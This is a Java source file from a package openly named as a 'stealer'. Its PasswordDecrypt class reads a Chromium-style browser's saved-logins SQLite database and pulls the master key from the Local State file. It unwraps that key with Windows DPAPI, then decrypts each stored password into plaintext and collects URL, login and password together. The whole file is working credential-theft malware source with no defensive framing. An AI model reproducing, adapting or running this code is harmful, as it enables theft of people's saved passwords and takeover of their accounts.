package dev.kazi.stealer.utils.decrypt.password;

import dev.kazi.stealer.utils.decrypt.DecryptUtil;
import java.util.Arrays;
import java.util.Base64;
import org.json.JSONObject;
import dev.kazi.stealer.utils.Util;
import com.github.windpapi4j.WinDPAPI;
import java.sql.SQLException;
import java.sql.ResultSet;
import java.sql.Statement;
import java.sql.Connection;
import java.sql.DriverManager;
import java.util.HashSet;
import java.util.ArrayList;
import java.util.List;
import java.io.File;

public class PasswordDecrypt {

    private File PASSWORD_PATH;
    private File LOCAL_STATE_PATH;
    public List<String> PASSWORD_DATA;
    public List<String> PASSWORDS;
    
    public PasswordDecrypt(final String path0, final String path1) {
        this.PASSWORD_PATH = null;
        this.LOCAL_STATE_PATH = null;
        this.PASSWORD_PATH = new File(path0);
        this.LOCAL_STATE_PATH = new File(path1);
        this.PASSWORDS = new ArrayList<String>();
        this.PASSWORD_DATA = new ArrayList<String>();
    }
    
    public String getData() {
        final StringBuilder temp = new StringBuilder();
        this.PASSWORDS.forEach(password -> temp.append(password).append("\n"));
        return temp.toString();
    }
    
    public PasswordDecrypt getPasswords() {
        final HashSet<Password> PASSWORDS = new HashSet<Password>();
        Connection connection = null;
        File tempFile = null;
        try {
            tempFile = new File(this.PASSWORD_PATH.getAbsolutePath());
            connection = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
            final Statement statement = connection.createStatement();
            statement.setQueryTimeout(30);
            final ResultSet resultSet = statement.executeQuery("SELECT * FROM logins");
            while (resultSet.next()) {
                this.parsePasswordFromResult(tempFile, PASSWORDS, resultSet);
            }
        }
        catch (final Exception exception) {
            try {
                if (connection != null) {
                    connection.close();
                }
            }
            catch (final Exception ex) {}
        }
        finally {
            try {
                if (connection != null) {
                    connection.close();
                }
            }
            catch (final Exception ex2) {}
        }
        return this;
    }
    
    private void parsePasswordFromResult(final File passwordStore, final HashSet<Password> passwordSet, final ResultSet resultSet) throws SQLException {
        final String url = resultSet.getString(1);
        final String name = resultSet.getString(4);
        final byte[] passwordBytes = resultSet.getBytes(6);
        final String format = "URL: " + url + "\nLogin: " + name + "\nPassword: " + this.decrypt(passwordBytes) + "\n";
        if (!format.split("\n")[2].equals("empty")) {
            this.PASSWORDS.add(format);
        }
    }
    
    private String decrypt(final byte[] encryptedBytes) {
        byte[] decryptedBytes = null;
        byte[] encryptedValue = encryptedBytes;
        try {
            final boolean isV10 = new String(encryptedValue).startsWith("v10") || new String(encryptedValue).startsWith("v11");
            if (WinDPAPI.isPlatformSupported()) {
                final WinDPAPI winDPAPI = WinDPAPI.newInstance(new WinDPAPI.CryptProtectFlag[] { WinDPAPI.CryptProtectFlag.CRYPTPROTECT_UI_FORBIDDEN });
                if (!isV10) {
                    decryptedBytes = winDPAPI.unprotectData(encryptedValue);
                }
                else {
                    if (!this.LOCAL_STATE_PATH.exists()) {}
                    final String localState = Util.toString(this.LOCAL_STATE_PATH);
                    final JSONObject jsonObject = new JSONObject(localState);
                    final String encryptedKeyBase64 = jsonObject.getJSONObject("os_crypt").getString("encrypted_key");
                    byte[] encryptedKeyBytes = Base64.getDecoder().decode(encryptedKeyBase64);
                    if (!new String(encryptedKeyBytes).startsWith("DPAPI")) {}
                    encryptedKeyBytes = Arrays.copyOfRange(encryptedKeyBytes, "DPAPI".length(), encryptedKeyBytes.length);
                    final byte[] keyBytes = winDPAPI.unprotectData(encryptedKeyBytes);
                    if (keyBytes.length != 32) {}
                    final byte[] nonceBytes = Arrays.copyOfRange(encryptedValue, "V10".length(), "V10".length() + 12);
                    encryptedValue = Arrays.copyOfRange(encryptedValue, "V10".length() + 12, encryptedValue.length);
                    decryptedBytes = DecryptUtil.getDecryptBytes(encryptedValue, keyBytes, nonceBytes);
                }
            }
        }
        catch (final Exception e) {
            return "empty";
        }
        if (decryptedBytes == null) {
            return "empty";
        }
        return new String(decryptedBytes);
    }
}
